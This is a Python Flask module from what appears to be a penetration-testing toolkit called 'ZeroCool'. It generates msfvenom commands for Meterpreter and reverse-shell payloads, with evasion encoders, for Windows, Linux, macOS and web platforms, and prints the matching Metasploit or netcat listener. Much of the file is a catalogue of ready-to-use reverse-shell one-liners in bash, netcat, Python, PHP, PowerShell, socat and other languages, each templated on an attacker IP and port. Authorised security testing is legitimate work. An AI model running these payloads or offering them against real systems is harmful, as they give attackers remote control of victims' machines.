"""Payload generator (msfvenom) for ZeroCool.

Builds an msfvenom command from a payload + format + encoder, pre-filled with
the engagement attacker IP, writes the output into the loot dir (servable via
File Transfer), and shows the matching listener / handler command.
"""

from __future__ import annotations

import os
import shlex

from flask import Blueprint, jsonify, render_template, request

import storage

payloads_bp = Blueprint("payloads", __name__)

# payload -> default output format + whether it needs a Metasploit handler
PAYLOADS = [
    {"group": "Windows", "value": "windows/x64/meterpreter/reverse_tcp", "fmt": "exe"},
    {"group": "Windows", "value": "windows/x64/meterpreter/reverse_https", "fmt": "exe"},
    {"group": "Windows", "value": "windows/x64/shell_reverse_tcp", "fmt": "exe"},
    {"group": "Windows", "value": "windows/meterpreter/reverse_tcp", "fmt": "exe"},
    {"group": "Windows", "value": "windows/shell_reverse_tcp", "fmt": "exe"},
    {"group": "Linux", "value": "linux/x64/meterpreter/reverse_tcp", "fmt": "elf"},
    {"group": "Linux", "value": "linux/x64/shell_reverse_tcp", "fmt": "elf"},
    {"group": "Linux", "value": "linux/x86/shell_reverse_tcp", "fmt": "elf"},
    {"group": "macOS", "value": "osx/x64/shell_reverse_tcp", "fmt": "macho"},
    {"group": "Web / scripting", "value": "php/meterpreter/reverse_tcp", "fmt": "raw"},
    {"group": "Web / scripting", "value": "php/reverse_php", "fmt": "raw"},
    {"group": "Web / scripting", "value": "java/jsp_shell_reverse_tcp", "fmt": "raw"},
    {"group": "Web / scripting", "value": "python/meterpreter/reverse_tcp", "fmt": "raw"},
    {"group": "Web / scripting", "value": "nodejs/shell_reverse_tcp", "fmt": "raw"},
    {"group": "Cmd / stagers", "value": "cmd/unix/reverse_bash", "fmt": "raw"},
    {"group": "Cmd / stagers", "value": "cmd/unix/reverse_python", "fmt": "raw"},
    {"group": "Cmd / stagers", "value": "cmd/windows/reverse_powershell", "fmt": "raw"},
]

FORMATS = ["exe", "exe-service", "dll", "msi", "elf", "macho", "raw", "hex", "c",
           "python", "psh", "psh-cmd", "psh-reflection", "hta-psh", "vba", "vba-psh",
           "vbs", "war", "jsp", "asp", "aspx", "jar", "powershell"]

ENCODERS = [
    {"value": "", "label": "(none)"},
    {"value": "x86/shikata_ga_nai", "label": "x86/shikata_ga_nai"},
    {"value": "x64/xor_dynamic", "label": "x64/xor_dynamic"},
    {"value": "x86/alpha_mixed", "label": "x86/alpha_mixed"},
    {"value": "cmd/powershell_base64", "label": "cmd/powershell_base64"},
]

EXT = {"exe": "exe", "exe-service": "exe", "dll": "dll", "msi": "msi", "elf": "elf",
       "macho": "macho", "raw": "bin", "hex": "hex", "c": "c", "python": "py",
       "psh": "ps1", "psh-cmd": "ps1", "psh-reflection": "ps1", "powershell": "ps1",
       "hta-psh": "hta", "vba": "vba", "vba-psh": "vba", "vbs": "vbs", "war": "war",
       "jsp": "jsp", "asp": "asp", "aspx": "aspx", "jar": "jar"}


# Reverse-shell one-liners (revshells-style). {ip}/{port}/{shell} substituted client-side.
REV_SHELLS = [
    {"g": "Bash", "label": "Bash -i", "cmd": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"},
    {"g": "Bash", "label": "Bash 196", "cmd": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"},
    {"g": "Bash", "label": "Bash read line", "cmd": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"},
    {"g": "Bash", "label": "Bash 5", "cmd": "bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"},
    {"g": "Bash", "label": "Bash UDP", "cmd": "bash -i >& /dev/udp/{ip}/{port} 0>&1"},

    {"g": "Netcat & sh", "label": "nc mkfifo", "cmd": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f"},
    {"g": "Netcat & sh", "label": "nc -e", "cmd": "nc {ip} {port} -e {shell}"},
    {"g": "Netcat & sh", "label": "nc -c", "cmd": "nc -c {shell} {ip} {port}"},
    {"g": "Netcat & sh", "label": "ncat -e", "cmd": "ncat {ip} {port} -e {shell}"},
    {"g": "Netcat & sh", "label": "ncat UDP", "cmd": "ncat --udp {ip} {port} -e {shell}"},
    {"g": "Netcat & sh", "label": "busybox nc", "cmd": "busybox nc {ip} {port} -e {shell}"},
    {"g": "Netcat & sh", "label": "rustcat", "cmd": "rcat connect -s {shell} {ip} {port}"},

    {"g": "Perl", "label": "Perl", "cmd": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'"},
    {"g": "Perl", "label": "Perl no sh", "cmd": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},

    {"g": "Python", "label": "Python3 (pty)", "cmd": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'"},
    {"g": "Python", "label": "Python3 (env)", "cmd": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'"},
    {"g": "Python", "label": "Python (subprocess)", "cmd": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"{shell}\")'"},

    {"g": "PHP", "label": "PHP exec", "cmd": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'"},
    {"g": "PHP", "label": "PHP shell_exec", "cmd": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} -i <&3 >&3 2>&3\");'"},
    {"g": "PHP", "label": "PHP system", "cmd": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} -i <&3 >&3 2>&3\");'"},

    {"g": "Ruby", "label": "Ruby", "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'"},
    {"g": "Ruby", "label": "Ruby no sh", "cmd": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"},

    {"g": "PowerShell", "label": "PowerShell #3", "cmd": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},

    {"g": "Socat", "label": "socat (TTY)", "cmd": "socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane"},
    {"g": "Socat", "label": "socat", "cmd": "socat tcp-connect:{ip}:{port} exec:{shell},pty,stderr,setsid,sigint,sane"},

    {"g": "Other", "label": "Telnet", "cmd": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF"},
    {"g": "Other", "label": "OpenSSL", "cmd": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"},
    {"g": "Other", "label": "Awk", "cmd": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"},
    {"g": "Other", "label": "Golang", "cmd": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"},
    {"g": "Other", "label": "Lua", "cmd": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\""},
    {"g": "Other", "label": "NodeJS", "cmd": "node -e 'sh = require(\"child_process\").spawn(\"{shell}\");var client = new require(\"net\").Socket();client.connect({port},\"{ip}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'"},
    {"g": "Other", "label": "Java", "cmd": "Runtime.getRuntime().exec(new String[]{\"{shell}\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"});"},
]


def _q(v):
    return shlex.quote(v) if v else ""


def needs_handler(payload: str) -> bool:
    return "meterpreter" in payload or payload.endswith("reverse_https")


def default_name(payload: str, fmt: str) -> str:
    base = payload.split("/")[0]  # windows / linux / php / ...
    return f"{base}_shell.{EXT.get(fmt, 'bin')}"


def build(p: dict, eng: dict) -> dict:
    payload = p.get("payload") or PAYLOADS[0]["value"]
    lhost = (p.get("lhost") or eng.get("attacker_ip") or "ATTACKER_IP").strip()
    lport = (p.get("lport") or "4444").strip()
    fmt = p.get("format") or "exe"
    enc = (p.get("encoder") or "").strip()
    iters = (p.get("iterations") or "").strip()
    bad = (p.get("badchars") or "").strip()
    extra = (p.get("extra") or "").strip()
    loot = (eng.get("output_dir") or "").strip()
    name = (p.get("outfile") or "").strip() or default_name(payload, fmt)
    out = os.path.join(loot, name) if loot else name

    parts = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt]
    if enc:
        parts += ["-e", enc]
        if iters:
            parts += ["-i", iters]
    if bad:
        parts += ["-b", _q(bad)]
    if extra:
        parts.append(extra)
    parts += ["-o", _q(out)]
    prefix = f"mkdir -p {_q(loot)} && " if loot else ""
    command = prefix + " ".join(parts)

    if needs_handler(payload):
        listener = (f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; '
                    f'set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; run -j"')
    else:
        listener = (f"Catch it on port {lport} — start a listener on the Reverse Shells "
                    f"page, or run: nc -lvnp {lport}")

    warnings = []
    if not eng.get("attacker_ip"):
        warnings.append("Set your attacker IP in the engagement (LHOST).")
    if not loot:
        warnings.append("No output dir set — saved to the current directory.")

    return {"command": command, "listener": listener, "outfile": out,
            "needs_handler": needs_handler(payload), "warnings": warnings}


@payloads_bp.route("/payloads")
def payloads():
    eng = storage.load_engagement()
    groups = []
    for p in PAYLOADS:
        if p["group"] not in groups:
            groups.append(p["group"])
    rev_groups = []
    for r in REV_SHELLS:
        if r["g"] not in rev_groups:
            rev_groups.append(r["g"])
    return render_template("payloads.html", eng=eng, payloads=PAYLOADS, groups=groups,
                           formats=FORMATS, encoders=ENCODERS,
                           rev_shells=REV_SHELLS, rev_groups=rev_groups)


@payloads_bp.route("/payloads/build", methods=["POST"])
def payloads_build():
    eng = storage.load_engagement()
    return jsonify(build(request.get_json(silent=True) or {}, eng))
